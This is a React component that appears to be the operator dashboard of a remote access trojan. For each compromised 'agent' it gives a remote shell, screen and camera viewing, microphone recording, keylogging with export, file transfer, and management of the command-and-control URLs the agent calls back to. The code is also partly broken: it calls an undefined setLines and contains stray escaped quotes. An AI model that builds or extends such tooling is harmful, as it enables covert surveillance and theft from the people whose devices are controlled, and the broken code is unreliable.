import { useEffect, useRef, useState } from 'react'
import { dashboardSocket } from '../utils/socket'
import RemoteView from './RemoteView'
import CameraView from './CameraView'
import KeylogPanel, { KeylogPanelHandle } from './KeylogPanel'
import FileExplorer from './FileExplorer'
import TerminalPane from './TerminalPane'
import MastersPanel from './MastersPanel'

type Agent = { agent_id: string; name: string; has_camera?: boolean }

type Props = { agent: Agent; onClose: () => void; onOpenHistory?: (agentId: string) => void }

export default function AgentTerminal({ agent, onClose, onOpenHistory }: Props) {
  const [linesArr, setLinesArr] = useState<string[][]>([[]])
  const lastPaneRef = useRef<number>(0)
  const lastLineRefs = useRef<string[]>([''])
  const [files, setFiles] = useState<Array<{ name: string; is_dir: boolean; size?: number; modified?: number }>>([])
  const [currentDir, setCurrentDir] = useState<string>('')
  const [uploading, setUploading] = useState(false)
  const uploadRef = useRef<HTMLInputElement | null>(null)
  const lastCmdRef = useRef<string>('')
  const [interactive, setInteractive] = useState(false)
  const [icmd, setIcmd] = useState('')
  const [activeTab, setActiveTab] = useState<'terminal' | 'remote' | 'camera'>('remote')
  const [splits, setSplits] = useState<1|2|3|4>(1)
  const [termH, setTermH] = useState<number>(520)
  const [termFont, setTermFont] = useState<number>(13)
  // Ensure linesArr matches number of splits
  useEffect(() => {
    setLinesArr((prev) => {
      const arr = prev.slice(0, splits)
      while (arr.length < splits) arr.push([])
      // ensure lastLineRefs length
      while (lastLineRefs.current.length < splits) lastLineRefs.current.push('')
      return arr
    })
  }, [splits])
  const [wpStyle, setWpStyle] = useState<'fill'|'fit'|'stretch'|'tile'|'center'|'span'>('fill')
  const wpUploadRef = useRef<HTMLInputElement | null>(null)
  const [showKeylog, setShowKeylog] = useState(false)
  const [keylogRunning, setKeylogRunning] = useState(false)
  const keylogRef = useRef<KeylogPanelHandle | null>(null)
  const [mastersOpen, setMastersOpen] = useState(false)
  const [masters, setMasters] = useState<Array<{ url: string; online?: boolean; current?: boolean }>>([])
  const [audioRate, setAudioRate] = useState<number>(44100)
  const [audioCh, setAudioCh] = useState<number>(1)
  const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || 'http://localhost:9000'
  const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''

  useEffect(() => {
    dashboardSocket.connect()
    const isKeylogLike = (s: string) => {
      const t = String(s || '')
      if (t.startsWith('Key.')) return true
      if (/^'.?'$/.test(t)) return true
      if (t === '[Keylog started]' || t === '[Keylog stopped]') return true
      return false
    }
    const handler = (line: string) => {
      // Intercept masters responses
      try {
        if (line && line[0] === '{') {
          const obj = JSON.parse(line)
          if (obj && obj.type === 'masters_list' && Array.isArray(obj.urls)) {
            const st = (obj as any).status || {}
            const cur = (obj as any).current || null
            setMasters((obj.urls as string[]).map((u) => ({ url: u, online: !!st[u], current: cur === u })))
            return
          }
        }
      } catch {}
      if (isKeylogLike(line)) return
      // Drop immediate duplicate echoes or repeats within short window
      const now = Date.now()
      if (!('__dedup' in (window as any))) { (window as any).__dedup = { last:"", lastAt:0 } }
      const dd = (window as any).__dedup as { last:string, lastAt:number }
      if (dd.last === line && (now - dd.lastAt) < 800) { return }
      dd.last = line; dd.lastAt = now
      setLinesArr((prev) => {
        const idx = Math.min(lastPaneRef.current, prev.length - 1)
        const arr = prev.map((p) => [...p])
        const last = arr[idx].length ? arr[idx][arr[idx].length - 1] : (lastLineRefs.current[idx] || '')
        if (last === line) return prev
        lastLineRefs.current[idx] = line
        arr[idx].push(line)
        return arr
      })
    }
    dashboardSocket.subscribe(agent.agent_id, handler)
    return () => dashboardSocket.unsubscribe(agent.agent_id, handler)
  }, [agent.agent_id])



  const refreshStats = async () => {
    try {
      const res = await fetch(`${apiBase}/agent/${agent.agent_id}/stats`, { headers: { Authorization: `Bearer ${token}` } })
      const data = await res.json()
      setFiles(Array.isArray(data?.files) ? data.files : [])
      setCurrentDir(typeof data?.current_dir === 'string' ? data.current_dir : '')
    } catch {}
  }

  const triggerUpload = () => uploadRef.current?.click()

  const onUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    setUploading(true)
    try {
      const fd = new FormData()
      fd.append('file', file)
      const res = await fetch(`${apiBase}/agent/${agent.agent_id}/upload`, { method: 'POST', body: fd, headers: { Authorization: `Bearer ${token}` } })
      await res.json()
      await refreshStats()
    } catch {}
    setUploading(false)
    if (uploadRef.current) uploadRef.current.value = ''
  }

  useEffect(() => {
    // initial fetch when opening
    refreshStats()
  }, [agent.agent_id])

  // File explorer auto-refresh link (optional to a specific pane)
  const [linkExplorerPane, setLinkExplorerPane] = useState<number | null>(0)
  useEffect(() => {
    // When splitting, default to no link; when single, link to pane 1 (index 0)
    setLinkExplorerPane((prev) => (splits === 1 ? 0 : (prev !== null && prev < splits ? prev : null)))
  }, [splits])

  useEffect(() => {
    const onExit = (code: number) => {
      const lc = (lastCmdRef.current || '').trim().toLowerCase()
      if (
        code === 0 && (lc === 'cd' || lc.startsWith('cd ') || lc.startsWith('chdir ')) &&
        linkExplorerPane !== null && lastPaneRef.current === linkExplorerPane
      ) {
        refreshStats()
      }
    }
    dashboardSocket.onExit(agent.agent_id, onExit)
    return () => dashboardSocket.offExit(agent.agent_id, onExit)
  }, [agent.agent_id, linkExplorerPane])

  useEffect(() => {
    // auto-exit interactive on process end
    const onExit2 = (_: number) => setInteractive(false)
    dashboardSocket.onExit(agent.agent_id, onExit2)
    return () => dashboardSocket.offExit(agent.agent_id, onExit2)
  }, [agent.agent_id])

  const cdUp = () => {
    lastCmdRef.current = 'cd ..'
    const sid = `pane-${(linkExplorerPane ?? lastPaneRef.current)}`
    dashboardSocket.sendPaneCommand(agent.agent_id, 'cd ..', sid)
  }
  const cdTo = (name: string) => {
    const cmd = `cd \"${name.replace(/\\\"/g, '\\\\\\\"').replace(/\"/g, '\\\"')}\"`
    lastCmdRef.current = cmd
    const sid = `pane-${(linkExplorerPane ?? lastPaneRef.current)}`
    dashboardSocket.sendPaneCommand(agent.agent_id, cmd, sid)
  }

  const download = async (name: string) => {
    try {
      const res = await fetch(`${apiBase}/agent/${agent.agent_id}/download?name=${encodeURIComponent(name)}`, { headers: { Authorization: `Bearer ${token}` } })
      if (!res.ok) return
      const blob = await res.blob()
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = name
      document.body.appendChild(a)
      a.click()
      URL.revokeObjectURL(url)
      a.remove()
    } catch {}
  }

  const onUploadWallpaper = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return
    try {
      const dataUrl: string = await new Promise((resolve, reject) => {
        const fr = new FileReader()
        fr.onload = () => resolve(String(fr.result || ''))
        fr.onerror = (err) => reject(err)
        fr.readAsDataURL(file)
      })
      dashboardSocket.setWallpaper(agent.agent_id, { data_url: dataUrl, style: wpStyle })
      setLines((prev)=>[...prev, `[Wallpaper] uploaded and requested`])
    } catch {}
    if (wpUploadRef.current) wpUploadRef.current.value = ''
  }

  const setWallpaperFromFile = (name: string) => {
    const n = (name || '').trim(); if (!n) return; dashboardSocket.setWallpaper(agent.agent_id, { path: n, style: wpStyle }); setLines((prev)=>[...prev, `[Wallpaper] request from file: ${n}`])
  }

  const autoDownloadLatestAudio = async () => {
    try {
      const url = new URL(`${apiBase}/admin/history`)
      url.searchParams.set('kind', 'audio')
      url.searchParams.set('agent_id', agent.agent_id)
      url.searchParams.set('limit', '1')
      const r = await fetch(url.toString(), { headers: { Authorization: `Bearer ${token}` } })
      const j = await r.json()
      const it = Array.isArray(j?.items) && j.items.length ? j.items[0] : null
      if (it && it.storage_url) {
        const a = document.createElement('a')
        a.href = `${apiBase}${it.storage_url}`
        a.download = `audio-${(agent.name||agent.agent_id).replace(/[^\w\-\. ]+/g, '_')}-${Date.now()}.wav`
        document.body.appendChild(a)
        a.click()
        a.remove()
      }
    } catch {}
  }

  // Selection + clipboard
  const [selected, setSelected] = useState<Set<string>>(new Set())
  const [clipboard, setClipboard] = useState<{ items: string[]; mode: 'copy'|'cut'; dir: string } | null>(null)
  const toggleSelect = (name: string) => {
    setSelected((prev) => {
      const next = new Set(prev)
      if (next.has(name)) next.delete(name); else next.add(name)
      return next
    })
  }
  const clearSelection = () => setSelected(new Set())
  const selectAll = () => setSelected(new Set(files.map(f => f.name)))
  const doCopy = () => {
    if (!selected.size) return
    setClipboard({ items: Array.from(selected), mode: 'copy', dir: currentDir })
  }
  const doCut = () => {
    if (!selected.size) return
    setClipboard({ items: Array.from(selected), mode: 'cut', dir: currentDir })
  }
  const doPaste = () => {
    if (!clipboard) return
    const payload = { items: clipboard.items, src_dir: clipboard.dir, dest_dir: currentDir }
    if (clipboard.mode === 'copy') {
      dashboardSocket.fsCopy(agent.agent_id, payload as any)
      setLines((prev)=>[...prev, `[fs] copy ${clipboard.items.length} -> ${currentDir}`])
    } else {
      dashboardSocket.fsMove(agent.agent_id, payload as any)
      setLines((prev)=>[...prev, `[fs] move ${clipboard.items.length} -> ${currentDir}`])
      // Optimistically clear selection
      setSelected(new Set())
      setClipboard(null)
    }
    // Refresh listing after a short delay
    setTimeout(() => refreshStats(), 800)
  }

  // Terminal helpers
  const appendLocalEcho = (s: string, paneIdx?: number) => setLinesArr((prev)=>{
    const idx = typeof paneIdx === 'number' ? Math.min(paneIdx, prev.length-1) : Math.min(lastPaneRef.current, prev.length-1)
    const arr = prev.map(p=>[...p])
    arr[idx].push(s)
    return arr
  })
  const stopInteractiveGlobal = () => { dashboardSocket.endInteractive(agent.agent_id); setInteractive(false) }

  return (
    <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 8 }}>
        <div style={{ color: '#9efc9e' }}>Agent: {agent.name} {(agent as any).country_code ? (<span style={{ color: '#9efc9e', fontSize: 12 }}>({(agent as any).country_code})</span>) : null} {interactive && <span style={{ color:'#ffb347', fontSize:12, marginLeft:8 }}>(interactive)</span>}</div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
          <button className="btn secondary" onClick={refreshStats}>Refresh</button>
          <button className=\"btn secondary\" onClick={() => { if (confirm('Reset the command queue?')) { dashboardSocket.queueReset(agent.agent_id); setLines((prev) => [...prev, '[Queue] Reset requested']); } }}>Refresh Queue</button>
<select className=\"input\" value={audioRate} onChange={(e)=>setAudioRate(parseInt(e.target.value)||44100)} title=\"Sample rate\">
            {[8000,16000,22050,44100,48000].map((r)=>(<option key={r} value={r}>{r} Hz</option>))}
          </select>
          <select className=\"input\" value={audioCh} onChange={(e)=>setAudioCh(parseInt(e.target.value)||1)} title=\"Channels\">
            <option value={1}>Mono</option>
            <option value={2}>Stereo</option>
          </select>
          <button className=\"btn secondary\" onClick={() => { dashboardSocket.sendAgentJson(agent.agent_id, { type: 'audio_start', sample_rate: audioRate, channels: audioCh }); }}>Start Audio</button>
          <button className=\"btn secondary\" onClick={async () => { dashboardSocket.sendAgentJson(agent.agent_id, { type: 'audio_stop' }); setTimeout(() => autoDownloadLatestAudio(), 1200); }}>Stop Audio</button>
          <button className="btn secondary" onClick={() => { if (confirm('Hard reset the agent connection? This will drop and reconnect.')) { dashboardSocket.hardReset(agent.agent_id); setLines((prev) => [...prev, '[Hard reset requested]']); } }}>Hard Reset</button>
          <button className="btn secondary" onClick={async () => { if (!keylogRunning) { dashboardSocket.startKeylog(agent.agent_id); setKeylogRunning(true); setShowKeylog(true); } else { dashboardSocket.stopKeylog(agent.agent_id); setKeylogRunning(false); try { await keylogRef.current?.exportAndSave() } catch {} } }}>{keylogRunning ? 'Stop Keylog' : 'Start Keylog'}</button>
          <button className="btn secondary" onClick={() => { setMastersOpen(true); dashboardSocket.sendAgentJson(agent.agent_id, { type: 'masters_list' }) }}>Agent URLs</button>
          <button className="btn secondary" onClick={() => onOpenHistory && onOpenHistory(agent.agent_id)}>History</button>
          <button className="btn secondary" onClick={() => { const newAlias = prompt('Alias for this agent (leave empty to clear):', (agent as any).alias || agent.name || ''); if (newAlias !== null) { fetch(`${apiBase}/admin/agents/${encodeURIComponent(agent.agent_id)}/alias`, { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }, body: JSON.stringify({ alias: newAlias || null }) }).catch(()=>{}); } }}>Rename</button>
          <input className="input" placeholder="Interactive command (e.g., python game.py)" value={icmd} onChange={(e) => setIcmd(e.target.value)} style={{ width: 260 }} />
          {!interactive ? (
            <button className="btn" onClick={() => { const c = (icmd || '').trim(); if (!c) return; setInteractive(true); dashboardSocket.startInteractive(agent.agent_id, c); }}>Start Interactive</button>
          ) : (
            <button className="btn secondary" onClick={() => { dashboardSocket.endInteractive(agent.agent_id); setInteractive(false); }}>Stop Interactive</button>
          )}
          <button className="btn secondary" onClick={onClose}>Close</button>
        </div>
      </div>
      <div style={{ display: 'flex', gap: 12, alignItems: 'stretch', minHeight: 560 }}>
        {/* Left: File Explorer Sidebar */}
        <aside style={{ width: 340, minWidth: 260, maxWidth: 520, resize: 'horizontal', overflow: 'hidden', borderRight: '1px solid #222', paddingRight: 8 }}>
          <div style={{ display: 'flex', gap: 6, alignItems: 'center', marginBottom: 6 }}>
            <button className="btn" onClick={triggerUpload} disabled={uploading}>{uploading ? 'Uploading...' : 'Upload file'}</button>
            <input ref={uploadRef} type="file" style={{ display: 'none' }} onChange={onUpload} />
            <select className="input" value={wpStyle} onChange={(e)=>setWpStyle(e.target.value as any)} style={{ width: 120 }}>
              <option value="fill">Fill</option>
              <option value="fit">Fit</option>
              <option value="stretch">Stretch</option>
              <option value="tile">Tile</option>
              <option value="center">Center</option>
              <option value="span">Span</option>
            </select>
            <button className="btn" onClick={() => wpUploadRef.current?.click()}>Upload wallpaper</button>
            <input ref={wpUploadRef} type="file" accept="image/*" style={{ display: 'none' }} onChange={onUploadWallpaper} />
          </div>
          <FileExplorer
            files={files as any}
            currentDir={currentDir}
            selected={selected}
            onToggle={toggleSelect}
            onClearSelection={clearSelection}
            onSelectAll={selectAll}
            onCopy={doCopy}
            onCut={doCut}
            onPaste={doPaste}
            clipboard={clipboard}
            onUp={cdUp}
            onCdTo={cdTo}
            onDownload={download}
            onSetWallpaper={setWallpaperFromFile}
          />
        </aside>
        {/* Right: Tabs */}
        <main style={{ flex: 1, minWidth: 0, display: 'flex', flexDirection: 'column', gap: 8 }}>
          <div style={{ borderBottom: '1px solid #222', display: 'flex', gap: 8, position: 'sticky', top: 0, background: '#0b0b0b', zIndex: 1, alignItems: 'center' }}>
            <button className={`btn ${activeTab === 'terminal' ? '' : 'secondary'}`} onClick={() => setActiveTab('terminal')}>Terminal</button>
            <button className={`btn ${activeTab === 'remote' ? '' : 'secondary'}`} onClick={() => setActiveTab('remote')}>Remote View</button>
            <button className={`btn ${activeTab === 'camera' ? '' : 'secondary'}`} disabled={!((agent as any).has_camera === true)} onClick={() => setActiveTab('camera')}>Camera</button>
            {activeTab === 'terminal' && (
                <div style={{ display: 'inline-flex', gap: 10, marginLeft: 'auto', alignItems: 'center' }}>
                <div style={{ display: 'inline-flex', gap: 10, alignItems: 'center' }}>
                  <div style={{ display: 'inline-flex', gap: 4, alignItems: 'center' }}>
                    <span style={{ color: '#888', fontSize: 12 }}>Height:</span>
                    <input type="range" min={240} max={900} step={20} value={termH} onChange={(e)=>setTermH(parseInt((e.target as HTMLInputElement).value) || 520)} />
                    <span style={{ color: '#aaa', fontSize: 12 }}>{termH}px</span>
                  </div>
                  <div style={{ display: 'inline-flex', gap: 4, alignItems: 'center' }}>
                    <span style={{ color: '#888', fontSize: 12 }}>Font:</span>
                    <input type="range" min={10} max={22} step={1} value={termFont} onChange={(e)=>setTermFont(parseInt((e.target as HTMLInputElement).value) || 13)} />
                    <span style={{ color: '#aaa', fontSize: 12 }}>{termFont}px</span>
                  </div>
                </div>
                <div style={{ display: 'inline-flex', gap: 8, alignItems: 'center' }}>
                  <span style={{ color: '#888', fontSize: 12 }}>Explorer link:</span>
                  <select className="input" value={linkExplorerPane === null ? 'none' : String(linkExplorerPane)} onChange={(e)=>{
                    const v = e.target.value; if (v === 'none') setLinkExplorerPane(null); else setLinkExplorerPane(Math.min(parseInt(v)||0, splits-1))
                  }}>
                    <option value="none">None</option>
                    {Array.from({ length: splits }).map((_, i) => (
                      <option key={i} value={String(i)}>{i+1}</option>
                    ))}
                  </select>
                </div>
                <button className="btn secondary" onClick={() => { setLinesArr(arr=>arr.map(()=>[])); lastLineRefs.current = new Array(splits).fill('') }}>Clear logs</button>
                <div style={{ display: 'inline-flex', gap: 4, alignItems: 'center' }}>
                  <span style={{ color: '#888', fontSize: 12 }}>Split:</span>
                  {[1,2,3,4].map((n) => (
                    <button key={n} className={`btn ${splits===n as any ? '' : 'secondary'}`} onClick={() => setSplits(n as 1|2|3|4)}>{n}</button>
                  ))}
                </div>
              </div>
            )}
          </div>
          <div style={{ flex: 1, minHeight: 0 }}>
            {activeTab === 'terminal' && (
              <div style={{ display: 'grid', gridTemplateColumns: splits===1? '1fr' : '1fr 1fr', gap: 8 }}>
                {Array.from({ length: splits }).map((_, idx) => (
                  <TerminalPane
                    key={idx}
                    interactive={interactive}
                    lines={linesArr[idx] || []}
                    onEcho={(s)=>appendLocalEcho(s, idx)}
                    onSend={(cmd) => { lastPaneRef.current = idx; lastCmdRef.current = cmd; if (interactive) { dashboardSocket.sendStdin(agent.agent_id, cmd); } else { dashboardSocket.sendPaneCommand(agent.agent_id, cmd, `pane-${idx}`); } }}
                    stopInteractive={stopInteractiveGlobal}
                    height={termH}
                    fontSize={termFont}
                  />
                ))}
              </div>
            )}
            {activeTab === 'remote' && (
              <RemoteView agentId={agent.agent_id} agentName={agent.name} />
            )}
            {activeTab === 'camera' && (
              <CameraView agentId={agent.agent_id} agentName={agent.name} enabled={(agent as any).has_camera === true} onStarted={() => {}} />
            )}
          </div>
        </main>
      </div>
      <KeylogPanel ref={keylogRef} open={showKeylog} agentId={agent.agent_id} agentName={agent.name} onClose={() => setShowKeylog(false)} />
      <MastersPanel
        open={mastersOpen}
        urls={masters}
        onRefresh={() => dashboardSocket.sendAgentJson(agent.agent_id, { type: 'masters_list' })}
        onAdd={(url) => dashboardSocket.sendAgentJson(agent.agent_id, { type: 'masters_add', url })}
        onUpdate={(oldUrl, newUrl) => dashboardSocket.sendAgentJson(agent.agent_id, { type: 'masters_update', old: oldUrl, new: newUrl })}
        onDelete={(url) => dashboardSocket.sendAgentJson(agent.agent_id, { type: 'masters_delete', url })}
        onReconnect={() => dashboardSocket.sendAgentJson(agent.agent_id, { type: 'masters_reconnect' })}
        onClose={() => setMastersOpen(false)}
      />
    </div>
  )
}
